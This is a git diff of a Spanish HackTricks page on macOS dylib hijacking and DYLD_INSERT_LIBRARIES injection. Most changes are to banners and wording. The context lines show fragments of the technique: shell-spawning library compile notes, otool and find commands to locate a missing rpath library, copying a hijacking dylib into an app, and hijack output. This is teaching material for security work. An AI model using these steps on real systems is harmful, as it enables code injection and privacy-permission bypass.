@@ -1,22 +1,23 @@
 # macOS Dyld Hijacking & DYLD\_INSERT\_LIBRARIES
 
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Otras formas de apoyar a HackTricks:
-
-* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
-* Obtén la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
-* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
 ## DYLD\_INSERT\_LIBRARIES Ejemplo básico
 
-**Biblioteca a inyectar** para ejecutar una shell:
+**Biblioteca para inyectar** para ejecutar un shell:
 ```c
 // gcc -dynamiclib -o inject.dylib inject.c
 
@@ -61,7 +62,7 @@ El binario vulnerable objetivo es `/Applications/VulnDyld.app/Contents/Resources
 {% endtab %}
 
 {% tab title="LC_RPATH" %}
-{% code overflow="wrap %}
+{% code overflow="wrap" %}
 ```bash
 # Check where are the @rpath locations
 otool -l "/Applications/VulnDyld.app/Contents/Resources/lib/binary" | grep LC_RPATH -A 2
@@ -91,10 +92,10 @@ compatibility version 1.0.0
 {% endtab %}
 {% endtabs %}
 
-Con la información anterior sabemos que **no está verificando la firma de las bibliotecas cargadas** e intenta cargar una biblioteca desde:
+Con la información anterior sabemos que **no está verificando la firma de las bibliotecas cargadas** y **está intentando cargar una biblioteca de**:
 
-- `/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib`
-- `/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib`
+* `/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib`
+* `/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib`
 
 Sin embargo, la primera no existe:
 ```bash
@@ -104,7 +105,7 @@ pwd
 find ./ -name lib.dylib
 ./Contents/Resources/lib2/lib.dylib
 ```
-Entonces, ¡es posible secuestrarlo! Crea una biblioteca que **ejecute algún código arbitrario y exporte las mismas funcionalidades** que la biblioteca legítima al reexportarla. Y recuerda compilarla con las versiones esperadas:
+¡Así que es posible secuestrarlo! Crea una biblioteca que **ejecute algún código arbitrario y exporte las mismas funcionalidades** que la biblioteca legítima reexportándola. Y recuerda compilarla con las versiones esperadas:
 
 {% code title="lib.m" %}
 ```objectivec
@@ -126,7 +127,7 @@ gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Found
 ```
 {% endcode %}
 
-La ruta de reexportación creada en la biblioteca es relativa al cargador, cambiémosla por una ruta absoluta a la biblioteca a exportar:
+La ruta de reexportación creada en la biblioteca es relativa al cargador, cambiémosla por una ruta absoluta a la biblioteca para exportar:
 
 {% code overflow="wrap" %}
 ```bash
@@ -155,33 +156,34 @@ cp lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib"
 ```
 {% endcode %}
 
-Y **ejecutar** el binario y verificar que la **biblioteca se cargó**:
+Y **ejecuta** el binario y verifica que la **biblioteca fue cargada**:
 
 <pre class="language-context"><code class="lang-context">"/Applications/VulnDyld.app/Contents/Resources/lib/binary"
-<strong>2023-05-15 15:20:36.677 binary[78809:21797902] [+] dylib hijacked in /Applications/VulnDyld.app/Contents/Resources/lib/binary
-</strong>Usage: [...]
+<strong>2023-05-15 15:20:36.677 binary[78809:21797902] [+] dylib secuestrada en /Applications/VulnDyld.app/Contents/Resources/lib/binary
+</strong>Uso: [...]
 </code></pre>
 
 {% hint style="info" %}
-Un buen artículo sobre cómo abusar de esta vulnerabilidad para abusar de los permisos de la cámara de Telegram se puede encontrar en [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
+Un buen artículo sobre cómo abusar de esta vulnerabilidad para abusar de los permisos de la cámara de telegram se puede encontrar en [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
 {% endhint %}
 
-## Escala Mayor
+## Mayor Escala
 
-Si planeas intentar inyectar bibliotecas en binarios inesperados, podrías verificar los mensajes de eventos para descubrir cuándo se carga la biblioteca dentro de un proceso (en este caso, elimina el printf y la ejecución de `/bin/bash`).
+Si planeas intentar inyectar bibliotecas en binarios inesperados, podrías revisar los mensajes de evento para averiguar cuándo se carga la biblioteca dentro de un proceso (en este caso, elimina el printf y la ejecución de `/bin/bash`).
 ```bash
 sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"'
 ```
+{% hint style="success" %}
+Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Apoya a HackTricks</summary>
 
-Otras formas de apoyar a HackTricks:
-
-* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
-* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.
+* Revisa los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
+* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.
 
 </details>
+{% endhint %}
